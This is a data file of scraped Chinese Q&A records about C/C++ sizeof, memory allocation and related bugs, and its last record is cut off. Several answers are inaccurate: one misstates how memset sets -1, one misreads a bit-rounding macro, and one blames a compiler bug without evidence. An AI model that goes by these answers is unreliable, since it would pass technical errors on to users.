{"Answer": "类似sizeof(0)一样的错，sizeof的对象只能是数据类型或变量，一个常量怎么能sizeof那，0可以是字符0，也可以是整型0，也可以是长整型0等等，没有确定长度的对象，sizeof就会报错。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["KEIL V9 预编译出错，各位大神帮忙指点", ["代码如下：", "\n\n", "#ifndef size_t", "\n   #if sizeof((char*)0 - (char*)0) == sizeof(int) ", "\n       #define size_t          int", "\n   #else", "\n       #define size_t          long", "\n   #endif", "\n#endif", "\n\n", "error C308: invalid integer const expression", "\n指   #if sizeof((char*)0 - (char*)0) == sizeof(int)  表达式错误"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你需要去了解的一个知识点是&amp;#xff0c;字符串char*和字符串数组char[]的区别。&lt;/p&gt;\n&lt;p&gt;有关c字符串的定义&amp;#xff1a;C字符串在C语言中&amp;#xff0c;字符串实际上是使用空字符&amp;#39;\\0&amp;#39; 结尾的一维字符数组。&lt;br /&gt;也就是说&amp;#xff0c;如果要识别或者存储字符串&amp;#xff0c;默认会在字符串尾部有一个&amp;#39;\\0&amp;#39;作为结尾。&lt;br /&gt;接下来&amp;#xff0c;你就该了解字符串数组char[]的相关初始化方法。&lt;br /&gt;&amp;#61;&amp;#61;&amp;#61;》如果使用 char arr2[] &amp;#61; &amp;#34;abc&amp;#34;; 这种方式其实隐式是char arr2[] &amp;#61; {&amp;#39;a&amp;#39;,&amp;#39;b&amp;#39;,&amp;#39;c&amp;#39;, &amp;#39;\\0&amp;#39;}; 其数组长度是4而不是3&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["char数组与int数组元素下标区别在哪里", ["int arr1[]=｛1,2,3｝；", "char arr2[]=“abc”；", "那3的下标sizeof（arr1）/sizeof（arr1[0]）-1与'c'的下标sizeof（arr1）/sizeof（arr1[0]）-2，两个'\\0'不应该减的是一样的吗"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;应该不行吧&amp;#xff0c;传入函数的数组只是个地址&amp;#xff0c;不告诉它有多少个元素或者地址对应的内存空间有多长&amp;#xff0c;应该算不出来的。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c++函数和数组相关问题", ["c++函数中如何能在不传入数组内个数多少的情况下知道数组个数，主要不能用sizeof"]], "Tag": "程序设计"}
{"Answer": "```\r\n两者速度一样，都是0.0000sec\r\n赋值为0，建议使用int c[100]={0};，不用写头文件&lt;string.h&gt;，而且写代码速度更快，只需要一行\r\n赋值为-1，只能使用memset(c, 0, sizeof(int)*100);\r\n\r\n#include&lt;stdio.h&gt;\r\n#include&lt;time.h&gt;\r\nint main(){\r\n\t// 利用初始={0}赋值为0 \r\n\tclock_t start,end;\r\n    start = clock();\r\n    \r\n    int a[99999]={0};\r\n    int b[99999]={0};\r\n    int c[99999]={0};\r\n    int d[99999]={0};\r\n    int e[99999]={0};\r\n    \r\n    end = clock();\r\n    printf(\"time=%f\\n\",(double)((end-start)/CLK_TCK));\r\n} \r\n\r\n#include&lt;stdio.h&gt;\r\n#include&lt;time.h&gt;\r\n#include&lt;string.h&gt;\r\nint main(){\r\n\t//用初始memset赋值为0\r\n\tclock_t start,end;\r\n    start = clock();\r\n    \r\n    int a[99999];memset(a, 0, sizeof(int)*99999);\r\n    int b[99999];memset(b, 0, sizeof(int)*99999);\r\n    int c[99999];memset(c, 0, sizeof(int)*99999);\r\n    int d[99999];memset(d, 0, sizeof(int)*99999);\r\n    int e[99999];memset(e, 0, sizeof(int)*99999);\r\n    \r\n    end = clock();\r\n    printf(\"time=%f\\n\",(double)((end-start)/CLK_TCK));\r\n}\r\n\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么要用memset初始化数组的值？为什么不用数组初始化为0？", ["#include<stdio.h>\nint main(){\n    int a[5]={0,1,2}; \n    printf(\"%d\\n\",a[4]);//初始化元素默认为0，即使没被定义 \n    int b[5];//未初始化元素为随机\n    printf(\"%d\\n\",b[4]);\n\n    int c[100]={0};\n   //等价与memset(c, 0, sizeof(int)*100);，而且写起来很快\n   //那为什么在实际中，大家是用下面的\n     int c[100];\n     memset(c, 0, sizeof(int)*100);\n} \n", "\n\n", "原因一：", "\nint c[100]={0}，只能初始化为0，memset可以初始化为0或-1"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;运行结果是0.0&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/509105173146164.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;t&amp;#61;(int  * )malloc(2*sizeof(int));&lt;strong&gt;是给指针 t 动态申请空间&lt;/strong&gt;&amp;#xff0c;2*sizeof(int)就是申请的空间大小&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["有以下程序 程序运行后输出的结果是什么", ["你好  我想问一下 这个语句 t＝（int＊）malloc（2＊sizeof（int））  这个是什么意思  我查了查百度这是一个申请内存空间的函数   但是还是看不明白 大哥帮我解答一下"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;该回答通过自己思路及引用到GPTᴼᴾᴱᴺᴬᴵ搜索,得到内容具体如下&amp;#xff1a;&lt;br /&gt;下面是代码问题的解释和修改建议&amp;#xff1a;&lt;/p&gt;\n&lt;ol&gt;&lt;li&gt;&lt;p&gt;在主函数中&amp;#xff0c;将指向Sqstack结构体的指针stack初始化为0&amp;#xff0c;这意味着stack指针指向空地址&amp;#xff0c;传递给函数CreatStack的形参S也是空指针&amp;#xff0c;无法分配内存空间。如果要使用指针变量&amp;#xff0c;应该分配内存空间后再传递指针。&lt;/p&gt;\n&lt;/li&gt;&lt;li&gt;&lt;p&gt;在函数CreatStack中&amp;#xff0c;S-&amp;gt;base应该是一个指向SelemType类型指针的指针&amp;#xff0c;表示栈底指针。因此&amp;#xff0c;在分配内存时应该使用单级指针&amp;#xff0c;而不是双级指针。&lt;/p&gt;\n&lt;/li&gt;&lt;/ol&gt;\n&lt;p&gt;下面是修改后的完整代码&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;define&lt;/span&gt; STACK_INIT_SIZE 100   &lt;span class=\"hljs-comment\"&gt;//栈的初始大小&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; SelemType;        &lt;span class=\"hljs-comment\"&gt;//定义栈元素类型&lt;/span&gt;\n\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;Sq&lt;/span&gt; {\n    SelemType* base;\n    SelemType* top;      &lt;span class=\"hljs-comment\"&gt;//栈顶指针指向栈顶元素的下一个位置&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; stacksize;       &lt;span class=\"hljs-comment\"&gt;//表示当前栈可使用的最大容量&lt;/span&gt;\n} Sqstack;               &lt;span class=\"hljs-comment\"&gt;//顺序栈结构定义&lt;/span&gt;\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;CreatStack&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(Sqstack* S)&lt;/span&gt;&lt;/span&gt;; &lt;span class=\"hljs-comment\"&gt;//构造一个空栈S&lt;/span&gt;\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    Sqstack* stack &amp;#61; (Sqstack*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(Sqstack)); &lt;span class=\"hljs-comment\"&gt;//分配内存空间&lt;/span&gt;\n    &lt;span class=\"hljs-built_in\"&gt;CreatStack&lt;/span&gt;(stack);\n    &lt;span class=\"hljs-built_in\"&gt;free&lt;/span&gt;(stack);  &lt;span class=\"hljs-comment\"&gt;//释放内存空间&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;CreatStack&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(Sqstack* S)&lt;/span&gt;  &lt;span class=\"hljs-comment\"&gt;//构造一个空栈S&lt;/span&gt;\n&lt;/span&gt;{\n    S-&amp;gt;base &amp;#61; (SelemType*)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(STACK_INIT_SIZE * &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(SelemType));\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!S-&amp;gt;base) {\n        &lt;span class=\"hljs-built_in\"&gt;exit&lt;/span&gt;(&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;); &lt;span class=\"hljs-comment\"&gt;//分配内存失败&lt;/span&gt;\n    }\n    S-&amp;gt;top &amp;#61; S-&amp;gt;base;\n    S-&amp;gt;stacksize &amp;#61; STACK_INIT_SIZE;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;在主函数中&amp;#xff0c;我们先分配Sqstack结构体的内存空间&amp;#xff0c;然后将指针传递给函数CreatStack。在函数CreatStack中&amp;#xff0c;我们使用单级指针分配内存空间&amp;#xff0c;并将指针赋值给S-&amp;gt;base。最后&amp;#xff0c;在主函数结束时&amp;#xff0c;我们释放Sqstack结构体的内存空间。&lt;/p&gt;\n&lt;hr /&gt;\n&lt;p&gt;如果以上回答对您有所帮助&amp;#xff0c;点击一下采纳该答案&amp;#xff5e;谢谢&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["分配内存指针为空情况", ["\ntypedef struct Sq\n{\n    SelemType* base;\n    SelemType* top;                    ", "//", "栈顶指针指向栈顶元素的下一个位置\n    int stacksize;                            ", "//", "表示当前栈可使用的最大容量\n}Sqstack;                                        ", "//", "顺序栈结构定义\nint CreatStack(Sqstack*S);\nint main()\n{\n    Sqstack* stack=", "0", ";\n    CreatStack(stack);\n}\nint CreatStack(Sqstack* S)    ", "//", "构造一个空栈S\n{\n    **S->base = (SelemType*)malloc(STACK_INIT_SIZE * sizeof(SelemType));_**这里会报错，说S是nullptr,将形参位置改为Sqstack* S= (Sqstack*)malloc(sizeof(struct Sq))后错误任未变\n\n    ", "if", " (!  S->base)\n        ", "exit", "(", "1", ");                                    ", "//", "exit", "(x)x不为", "0", "都表示异常退出，头文件stdio.h\n    S->top = S->base;\n    S->stacksize = STACK_INIT_SIZE;\n    return ", "0", ";\n}****\n"]], "Tag": "程序设计"}
{"Answer": "是因为2的数据太多了\r\nvoid **a = (void **) malloc(indexSize + rows* rowSize);，分配失败，返回空值", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于用自定义函数开辟二维数组的问题", ["block1可以正常执行但是block2会出现内存错误，想了很久没有明白。求解答", "\n\n", " #include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nvoid** malloc2d(int rows, int cols, int size)\n{\n  printf(\"%d\\t%d\\t%d\\n\",rows,cols,size);\n  int j;\n  int rowSize = cols * size;\n  int indexSize = rows * sizeof(void *);\n  void **a = (void **) malloc(indexSize + rows* rowSize);\n  char *dataStart = (char *) a + indexSize;\n  for(j = 0; j < rows; j++){\n    printf(\"%d\\n\",j);\n    a[j] = dataStart + j * rowSize;\n  }\n  return a;\n}\n\nint main(){\n    int i,rows,cols,row,col;\n    rows = cols = 40400;\n    row = 3;col = 2;\n    int** block1 = (int**)malloc2d(row,col,sizeof(int));\n    printf(\"end of block1,begin of block2\\n\");\n    int** block2 = (int**)malloc2d(rows,cols,sizeof(int));\n    free(block1);\n    free(block2);\n    return 0;\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;rcu_periph_clock_enable(RCU_CFGCMP);//需使能映射 时DMA_CH2映射到DMA_CH4&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["GD32E230C USART0串口用PB6 PB7引脚 ，并使用DMA传输", ["GD32E230C USART0串口用PB6 PB7引脚 ，并使用DMA传输，用的DMA_CH3作为上发到上位机和DMA_CH4接收，能上发，但无法通过DMA_CH4接收", "\n", "\n", "static int BSP_DmaConfig(dma_channel_enum dma_channelx,uint32_t peripheralAddr,uint32_t memoryAddr,uint32_t dir,uint32_t datasize)", "{", "    dma_parameter_struct dma_init_struct;", "    rcu_periph_clock_enable(RCU_DMA);", "    dma_deinit(dma_channelx);", "    dma_init_struct.direction=dir;", "    dma_init_struct.memory_addr=memoryAddr;", "    dma_init_struct.memory_inc=DMA_MEMORY_INCREASE_ENABLE;", "    dma_init_struct.memory_width=DMA_MEMORY_WIDTH_8BIT;", "    dma_init_struct.number=datasize;", "    dma_init_struct.periph_addr=peripheralAddr;", "    dma_init_struct.periph_inc=DMA_PERIPH_INCREASE_DISABLE;", "    dma_init_struct.periph_width=DMA_PERIPHERAL_WIDTH_8BIT;", "    dma_init_struct.priority=DMA_PRIORITY_ULTRA_HIGH;", "    /* configure DMA mode */", "    dma_circulation_disable(dma_channelx);   //禁止循环模式", "    dma_memory_to_memory_disable(dma_channelx); //禁止内存到内存", "    dma_init(dma_channelx,&dma_init_struct);", "\n", "/* enable DMA channel */", "\ndm", "a_channel", "_enable(dm", "a_channelx", ")", ";    ", "\nif(dm", "a_channelx", "==DM", "A_CH3", ")\n{\nsyscfg_dm", "a_remap", "_enable(SYSCFG_DM", "A_REMAP", "_USART0TX)", ";", "\n}\nelse if(dm", "a_channelx", "==DM", "A_CH4", ")\n{\n", "\n", "  syscfg_dma_remap_enable(SYSCFG_DMA_REMAP_USART0RX);", "    }", "    return 0;", "}", "\n", "void USART0_IRQHandler(void)", "{", "        volatile uint32_t clear;", "        volatile uint16_t msgLength = 0;", "\n", "    if(usart_interrupt_flag_get(USART0x, USART_INT_FLAG_IDLE) != RESET){  \n        printf(", "\"recive\\r\\n\"", ")", ";", "\n        usart_interrupt_flag_clear(USART0x,USART_INT_FLAG_IDLE)", ";    ", "\n        //使用长度=总长度-剩余的长度\n        msgLength = (uint16_t)(DM", "A_UART0", "_DATASIZE-dm", "a_transfer", "_number_get(DM", "A_CH2", "))", ";", "\n        printf(", "\"channel%d %d  %d\\r\\n\"", ",msgLength,sizeof(gUartData.USART0_RxData),dm", "a_transfer", "_number_get(DM", "A_CH2", "))", ";", "\n        //清除中断\n        clear=USART_STAT(USART0x)", ";", "\n        clear=USART_RDATA(USART0x)", ";    ", "\n        dm", "a_channel", "_disable(DM", "A_CH2", ")", ";                                        //关闭DMA传输", "\n        Control_Upper_Computer((uint8_t*)gUartData.USART0_RxData, msgLength)", ";", "\n        \n        //由于是单次传输，需要再次初始化\n        dm", "a_interrupt", "_flag_clear(DM", "A_CH2", ",DM", "A_INT", "_FLAG_FTF)", ";", "\n        dm", "a_interrupt", "_flag_clear(DM", "A_CH2", ",DM", "A_INT", "_FLAG_ERR)", ";", "\n        dm", "a_flag", "_clear(DM", "A_CH2", ",DM", "A_FLAG", "_FTF)", ";", "\n        dm", "a_flag", "_clear(DM", "A_CH2", ",DM", "A_FLAG", "_ERR)", ";", "\n", "\n", "//            dma_memory_address_config(DMA_CH2,(uint32_t)gUartData.USART0_RxData[DMA_UART0_DATASIZE]);", "//            dma_transfer_number_config(DMA_CH2,DMA_UART0_DATASIZE);    //数据传输量", "//            dma_channel_enable(DMA_CH2);                                            //开启DMA传输", "                        dma_memory_address_config(DMA_CH2,(uint32_t)gUartData.USART0_RxData);", "            dma_transfer_number_config(DMA_CH2,sizeof(gUartData.USART0_RxData));    //数据传输量", "            dma_channel_enable(DMA_CH2);", "        }", "}", "\n", "运行结果及报错内容", "\n", "\n", "无法接收到数据，一直显示接收的数据大小为0，因为DMA_CH2已被SPI传输用掉，所以USART0想用DMA_CH4代替", "\n", "请大家帮忙看看是映射出问题了吗，还是配置没对？"]], "Tag": "程序设计"}
{"Answer": "将dlg换成CVSOConnectorDlg*，或者全局变量。\r\n编译器bug！！！", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["MFC Dialog报错问题，m_hWnd为空", ["代码如下：", "\nBOOL CVSOConnectorApp::InitInstance()", "\n{", "\n    //m_pMainWnd = (CWnd*)malloc(sizeof(m_pMainWnd));", "\n    INITCOMMONCONTROLSEX InitCtrls;", "\n    InitCtrls.dwSize = sizeof(InitCtrls);", "\n\n", "InitCtrls.dwICC = ICC_WIN95_CLASSES;\nInitCommonControlsEx(&InitCtrls);\n\nchar buf[MAXBUFSIZE + 1];\nchar value[MAXPARAMETERLEN + 1];\n\nCVSOConnectorDlg dlg;//报错地方，debug模式下只要执行到这就会报错，release下是ok的\nm_pMainWnd = &dlg;\n\n错误信息如图\n"]], "Tag": "程序设计"}
{"Answer": "已解决，因为在窗口系统下，Kernel函数的执行有时间限制，Kernel函数执行时间过长而出错了", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["cuda核函数不执行的可能原因？", ["练习中遇到一个问题，核函数不执行，不知道原因？", "\ntypedef struct", "\n{", "\n    int x;", "\n    int y;", "\n}TstRst;", "\n\n", "typedef struct", "\n{", "\n    int x;", "\n    int y;", "\n    int z;", "\n}TstDat;", "\n\n", "device", " int TstDeviceFun(const int * pData1, const int * pData2)", "\n{", "\n    return 100;", "\n}", "\n\n", "global", " void Kernel_Tst(TstRst*pRsts, const TstDat *pDats, const int nCount)", "\n{", "\n    int i = threadIdx.x;", "\n    pRsts[i].y = 100;", "\n\n", "return;\n", "\n\n", "}", "\nmain里的相关调用如下", "\n    int nCount = 200;", "\n    TstRst*pTstRsts;", "\n    TstDat ", "pTstDats;", "\n    TstRst*pAjustRsts = (TstRst", ")malloc(nCount * sizeof(TstRst));", "\n    TstDat*pAjustDats = (TstDat*)malloc(nCount * sizeof(TstDat));", "\n    memset(pAjustRsts, 0, nCount * sizeof(TstRst));", "\n    memset(pAjustDats, 0, nCount * sizeof(TstDat));", "\n\n", "cudaMalloc((void**)&pTstRsts, nCount * sizeof(TstRst));\ncudaMemcpy(pTstRsts, pAjustRsts, nCount * sizeof(TstRst), cudaMemcpyHostToDevice);\n\ncudaMalloc((void**)&pTstDats, nCount * sizeof(TstDat));\ncudaMemcpy(pTstDats, pAjustDats, nCount * sizeof(TstDat), cudaMemcpyHostToDevice);\n\nKernel_Tst <<<1, 100 >>>(pTstRsts, pTstDats, 100);\ncudaStatus = cudaMemcpy(pAjustRsts, pTstRsts, nStockCount * sizeof(StockCoorInfo), cudaMemcpyDeviceToHost);\ncudaStatus = cudaThreadSynchronize();\n"]], "Tag": "程序设计"}
{"Answer": "首先你要弄清楚这是个数组，元素类型是char *指针。\r\n然后两种方式：\r\n1. sizeof(s) / sizeof(s[0])\r\n2. sizeof(s) / sizeof(char *)", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在C中求char* s[]={}；数组元素的个数算法", ["在C中求char* s[]={\"key1=value1\",\"key2=   value2\",\"key3 =value3  \"}中s数组元素的个数", "\n\n", "如，在这个指针数组中元素个数为3；", "\n用什么算法可以算出3：", "\n我用sizeof(s)/sizeof(**s),这个得出值为12"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;如果一个函数参数是数组类型&amp;#xff0c;该参数类型自动转换为相应的指针类型。即&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;sort&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; a[])&lt;/span&gt;&lt;/span&gt;;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;sort&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; a[&lt;span class=\"hljs-number\"&gt;100&lt;/span&gt;])&lt;/span&gt;&lt;/span&gt;;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;自动转换为&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;sort&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; *a)&lt;/span&gt;&lt;/span&gt;;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;数组大小的信息丢失&amp;#xff0c;因为你需要额外用一个参数来传递数组大小&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;sort&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; a[], &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; size)&lt;/span&gt;&lt;/span&gt;;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;但是如果参数是数组引用类型&amp;#xff0c;那么该参数类型的数组大小信息是被保留的。&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-keyword\"&gt;void&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;sort&lt;/span&gt;(&lt;span class=\"hljs-params\"&gt;&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt; (&amp;amp;a&lt;/span&gt;)[100])&lt;/span&gt;\n{\n    cout &amp;lt;&amp;lt; &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(a) / &lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;) &amp;lt;&amp;lt; endl; &lt;span class=\"hljs-comment\"&gt;// 输出100&lt;/span&gt;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;a href=\"https://en.cppreference.com/w/c/language/array#Array_to_pointer_conversion\" id=\"textarea_1647293234431_1647295590231_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;span class=\"md_link_url\"&gt;https://en.cppreference.com/w/c/language/array#Array_to_pointer_conversion&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;When an array type is used in a function parameter list, it is transformed to the corresponding pointer type: &lt;code class=\"language-javascript\"&gt;int f(int a[2])&lt;/code&gt; and &lt;code class=\"language-javascript\"&gt;int f(int* a)&lt;/code&gt; declare the same function. Since the function&amp;#39;s actual parameter type is pointer type, a function call with an array argument performs array-to-pointer conversion; the size of the argument array is not available to the called function and must be passed explicitly:&lt;/p&gt;\n&lt;/blockquote&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["带入function array size输出为何不同", ["\n", "#include <iostream>", "\n", "using", " ", "namespace", " ", "std", ";\n\n\n", "void", " ", "sort", "(", "int", " a[]", ")", "\n{\n    ", "int", " b=", "sizeof", "(a)/", "sizeof", "(a[", "0", "]);\n    cout<<b<<endl;\n}\n\n", "int", " ", "main", "(", ")", "{\n    ", "int", " a[", "100", "]={", "1", ",", "4", ",", "2", ",", "4", ",", "5", ",", "2", ",", "3", "};\n    ", "int", " b=", "sizeof", "(a)/", "sizeof", "(a[", "0", "]);\n    cout<<b<<endl;\n    sort(a)；\n}\n", "\n", "为什么输出array size是100 2，而不是两个100"]], "Tag": "程序设计"}
{"Answer": "参考：http://www.cnblogs.com/runliuv/p/3489427.html", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么SetEnvironmentVariable没有修改环境变量", ["    PTSTR pszEnvironmentName = NULL;\n    PTSTR pszEnvironmentValue = NULL;\n    DWORD dwValueLength = 0;\n\n    pszEnvironmentName = (PTSTR)malloc(MAX_PATH * sizeof(TCHAR));\n    GetDlgItemText(hDlg, IDD_EDIT_NAME, pszEnvironmentName, MAX_PATH);\n\n    pszEnvironmentValue = (PTSTR)malloc(1024 * sizeof(TCHAR) * 3);\n    GetDlgItemText(hDlg, IDD_EDIT_VALUE, pszEnvironmentValue, \n        1024 * sizeof(TCHAR) * 3);\n\n    if (SetEnvironmentVariable(pszEnvironmentName, pszEnvironmentValue))\n    {\n        MessageBox(hDlg, TEXT(\"修改成功!\"), TEXT(\"成功\"), MB_OK);\n    }\n    else\n    {\n        MessageBox(hDlg, TEXT(\"修改失败!\"), TEXT(\"失败\"), MB_OK);\n    }\n\n    //释放分配的内存\n    free(pszEnvironmentValue);\n    free(pszEnvironmentName);\n", "\n\n", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你把前面的sizeof(long)&amp;#61;删掉试试&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["哪里的步骤出错了呢？", ["#include <stdio.h>", "int main()", "｛", "      printf(\" sizeof(long)=% d\\n\", sizeof( long));", "      return 0;", "\n", "｝"]], "Tag": "程序设计"}
{"Answer": "popen(), pclose(): _POSIX_C_SOURCE &gt;= 2 || _XOPEN_SOURCE || _POSIX_SOURCE _BSD_SOURCE || _SVID_SOURCE\r\n\r\nglibc是否支持这两个函数，需要测试上面的几个宏是否define了。如果这几个宏有任意一个define，则支持，否则就是不支持啦。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["linux下C语言使用stdio.h库中popen和pclose函数编译报错", ["error: implicit declaration of function ‘popen’; did you mean ‘fopen’? [-Werror=implicit-function-declaration]", "\n error: implicit declaration of function ‘pclose’; did you mean ‘fclose’? [-Werror=implicit-function-declaration]", "\n请问下为什么这样会报隐式声明错误呀？", "\n\n", "源代码如下:", "\n\n", "        GList *fList = s_wEntries;\n        s_wEntries=NULL;\n        FILE *fstream=NULL;\n        char buff[1024];\n        memset(buff,0,sizeof(buff));\n        // execute command get all video\n        char *launchword=\"find / -name *\";\n        strcat(launchword,cText);\n        strcat(launchword,\"*\");\n        if(NULL==(fstream=popen(launchword,\"r\")))\n        {\n\n\n        }\n        else\n        {\n            memset(buff, 0x00, sizeof(buff));\n            FileEntryInfo *Finfo;\n            GtkMenuItem* searchmenuitem;\n            while(NULL!=fgets(buff, sizeof(buff), fstream)){\n                   if(buff[0]=='/')\n                   {\n\n\n                        searchmenuitem=gtk_menu_item_new_with_label(buff);\n                        Finfo->uri=buff;\n                        Finfo->pMenuItem=searchmenuitem;\n                        g_list_prepend(s_wEntries,Finfo);   \n                   }\n\n                memset(buff, 0x00, sizeof(buff));\n            }\n            pclose(fstream);\n        }\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;这个表达式是在对变量 a 做对齐操作。具体来说&amp;#xff0c;它是将 a 对 sizeof(long) 向上取整&amp;#xff0c;并且确保 a 是 sizeof(long) 的倍数。&lt;/p&gt;\n&lt;p&gt;让我来给你分析一下这个表达式:&lt;/p&gt;\n&lt;p&gt;1.首先&amp;#xff0c;将 a 强制转换为 unsigned long 类型&amp;#xff0c;这是为了确保在后面的运算中不会出现负数。&lt;br /&gt;2.然后, 加上 sizeof(long) * 8 - 1&amp;#xff0c;这是为了将 a 向上取整到 sizeof(long) 的倍数。这里之所以要乘8是因为long类型占8个字节&amp;#xff0c;而一个字节占8位&amp;#xff0c;所以要乘8.&lt;br /&gt;3.接着&amp;#xff0c;除以 8&amp;#xff0c;这是为了将 a 的值转换回字节数。&lt;br /&gt;4.最后&amp;#xff0c;使用按位与运算符 (&amp;amp;) 和一个按位取反 (~) 运算符将 a 对齐到 sizeof(long) 的倍数。这里的 ~(sizeof(long) - 1) 就是将sizeof(long) - 1取反&amp;#xff0c; ~1 &amp;#61; -2, ~2 &amp;#61; -3, ~4 &amp;#61; -5, ~8 &amp;#61; -9 ……这样就可以将a对齐到long类型所需的字节数了。&lt;br /&gt;综上&amp;#xff0c;这个表达式是将 a 向上取整到 sizeof(long) 的倍数&amp;#xff0c;并将其转换回字节数。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言一段位运算代码不是很理解", ["以下表达式对a做了什么操作？是将a对sizeof(long)向上取整吗？如何推导这个表达式？", "请尽量详细分析解答一下谢谢！", "\n", "(((", "unsigned", " ", "long", ")(a) + ", "sizeof", "(", "long", ") * ", "8", " - ", "1", ") / ", 